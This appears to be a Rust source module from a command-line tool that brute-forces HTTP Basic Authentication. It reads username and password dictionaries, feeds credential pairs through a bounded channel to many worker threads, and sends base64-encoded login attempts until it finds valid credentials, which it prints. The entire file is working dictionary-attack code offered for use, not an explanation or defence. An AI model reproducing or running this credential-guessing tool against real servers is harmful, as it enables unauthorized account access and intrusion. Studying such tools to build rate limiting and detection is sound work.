use crossbeam_channel::Receiver;
const MAX_NMUM_THREADS: &str = "MAX_NUM_THREADS";
const CHANNEL_BUFFER: &str = "CHANNEL_BUFFER";
const CHANNEL_BUFFER_DEF_VALUE: usize = 10000000;
use super::{
    connection::{http_req, is_basic_protected, BruteResponse},
    console::{print_help, print_result},
    logger::{error, info, log, warn},
};
use async_std::task;
use std::{
    collections::HashMap,
    fs::File,
    io::{self, BufRead},
    process,
    time::Instant,
};

pub fn execute_command(parsed_command: HashMap<String, String>, original_command: String) {
    let main = parsed_command.get("main");
    match main {
        Some(value) => match value.to_string().as_str() {
            "help" => print_help(),
            command => error(&format!("Invalid command {}", command)),
        },
        _ => run_attack(parsed_command, &original_command),
    }
}

fn run_attack(parsed_command: HashMap<String, String>, original_command: &str) {
    let uri = parsed_command.get("uri").unwrap();
    if is_basic_protected(&uri).is_some() {
        warn("Basic HTTP Authentication detected");
        generate_and_feed_threads(&parsed_command, original_command, uri.as_str());
    } else {
        error("No Basic HTTP Authentication detected");
        warn("Application will be terminated");
        process::exit(0x0000);
    }
}

fn generate_and_feed_threads(
    parsed_command: &HashMap<String, String>,
    original_command: &str,
    uri: &str,
) {
    let num_threads = load_env_variable_as_usize(MAX_NMUM_THREADS, num_cpus::get(), true);
    let channel_buffer = load_env_variable_as_usize(CHANNEL_BUFFER, CHANNEL_BUFFER_DEF_VALUE, true);

    info(&format!("The channel buffer is {}", channel_buffer));
    let start = Instant::now();
    let dictionary_attack = check_username_and_passwords;
    rayon::scope(|s| {
        let mut failed_and_restored_requests = 0;
        let (work_queue_sender, work_queue_receiver) = crossbeam_channel::bounded(channel_buffer);
        info(&format!("I will use [ {} ] threads", num_threads));
        for task_counter in 0..num_threads {
            let pc = parsed_command.clone();
            let work_receiver: Receiver<String> = work_queue_receiver.clone();
            s.spawn(move |_| {
                task::block_on(do_job(
                    task_counter,
                    num_threads,
                    uri,
                    &start,
                    work_receiver,
                    original_command,
                    &mut failed_and_restored_requests,
                    &pc,
                ));
            });
        }

        let filename_passwords = parsed_command.get("dictionary").unwrap();
        info(&format!(" Reading filename {}...", &filename_passwords));

        match parsed_command.get("usernames") {
            Some(usernames_file) => {
                if let Ok(usernames) = read_lines(usernames_file) {
                    warn("dictionary attack in progress...");
                    if !parsed_command.get("verbose").is_some() {
                        info("enable verbose mode to view the attack progress status");
                    }
                    for line in usernames {
                        if let Ok(username) = line {
                            dictionary_attack(
                                &work_queue_sender,
                                filename_passwords.as_str(),
                                &username,
                                num_threads,
                            );
                        }
                    }
                    drop(work_queue_sender);
                }
            }
            None => {
                let param_username = parsed_command.get("username").unwrap();
                warn("dictionary attack in progress...");
                if !parsed_command.get("verbose").is_some() {
                    info("enable verbose mode to view the attack progress status");
                }
                dictionary_attack(
                    &work_queue_sender,
                    filename_passwords.as_str(),
                    &param_username,
                    num_threads,
                );
                drop(work_queue_sender);
                return ();
            }
        };
    });
}

fn check_username_and_passwords(
    work_queue_sender: &crossbeam_channel::Sender<String>,
    filename_passwords: &str,
    username: &str,
    num_threads: usize,
) {
    let mut i = 0;
    if let Ok(passwords) = read_lines(filename_passwords) {
        for line in passwords {
            if let Ok(password) = line {
                work_queue_sender
                    .send(format!("{}|{}", username, password))
                    .unwrap();
                i = (i + 1) % num_threads;
            }
        }
    }
}

fn load_env_variable_as_usize(
    var_name: &str,
    default_value: usize,
    greater_than_zero: bool,
) -> usize {
    match dotenv::var(var_name) {
        Ok(data) => {
            let value = data.parse::<usize>().unwrap();
            if greater_than_zero && value <= 0 {
                return default_value;
            }
            return value;
        }
        Err(_) => default_value,
    }
}

async fn do_job(
    task_counter: usize,
    num_threads: usize,
    uri: &str,
    start: &Instant,
    work_receiver: Receiver<String>,
    original_command: &str,
    failed_and_restored_requests: &mut i32,
    parsed_command: &HashMap<String, String>,
) {
    info(&format!(
        "thread {} initialized and started the job",
        &task_counter
    ));

    loop {
        let tx_res = work_receiver.recv();

        match tx_res {
            Ok(tx) => {
                let separator_pos = tx.chars().position(|c| c == '|').unwrap();
                let username = &tx[0..separator_pos];
                let password = &tx[separator_pos + 1..];
                match task::block_on(attack_request(
                    task_counter,
                    &uri,
                    username,
                    password,
                    failed_and_restored_requests,
                    parsed_command,
                )) {
                    Ok(_) => {
                        let duration = start.elapsed();
                        log(&format!("original command: {:?}", original_command));
                        log(&format!("duration: {:?}", duration));
                        log(&format!("total n. of threads: {:?}", num_threads));
                        log(&format!(
                            "failed and restored requests: {:?}",
                            failed_and_restored_requests,
                        ));
                        log("===============================");
                        process::exit(0x0000);
                    }
                    Err(_) => (),
                }
            }
            Err(err) => {
                warn(&format!("thread {} finished job: {}", &task_counter, err));
                break;
            }
        }
    }
}

async fn attack_request(
    idx: usize,
    uri: &str,
    username: &str,
    password: &str,
    failed_and_restored_requests: &mut i32,
    parsed_command: &HashMap<String, String>,
) -> Result<BruteResponse, String> {
    let max_failed_requests = match parsed_command.get("max_failed_requests") {
        Some(val) => val.parse::<i32>().unwrap(),
        None => -1,
    };

    let auth = base64::encode(format!("{}:{}", &username, &password));
    let result: Result<BruteResponse, super::connection::BruteFailedMatchResponse> = http_req(
        uri,
        &auth,
        username,
        &password,
        failed_and_restored_requests,
        max_failed_requests,
    )
    .await;

    if result.is_ok() {
        let result = result.unwrap();
        print_result(
            idx,
            &result.message,
            &result.uri,
            &result.username,
            &result.password,
            &result.base64,
        );
        return Ok(result);
    } else {
        if parsed_command.get("verbose").is_some()
            && parsed_command.get("verbose").unwrap() == "true"
        {
            let err = result.err().unwrap();
            log(&format!(
                "[KO] -> thread: [{}] attempts: {}, ({}:{})",
                idx + 1,
                err.attempts,
                &username,
                &password
            ));
        }
    }
    Err("No password found".to_string())
}

fn read_lines(filename: &str) -> io::Result<io::Lines<io::BufReader<File>>> {
    let file = match File::open(filename) {
        Ok(file) => file,
        Err(err) => {
            error(&format!("{} for filename {}", err, filename));
            panic!();
        }
    };
    Ok(io::BufReader::new(file).lines())
}
